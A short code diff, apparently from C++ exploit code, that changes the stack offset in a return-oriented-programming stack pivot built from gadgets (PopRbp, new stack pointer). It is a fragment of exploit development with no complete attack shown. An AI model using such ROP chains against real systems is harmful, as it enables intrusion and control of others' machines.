@@ -202,7 +202,7 @@ private:
 
 		// Our pivot gadget uses rbp as the new stack pointer
 
-		auto newRsp = rsp - 0x3000;
+		auto newRsp = rsp - 0x1000;
 
 		PUT_STACK( m_Gadgets.PopRbp );
 		PUT_STACK( newRsp );
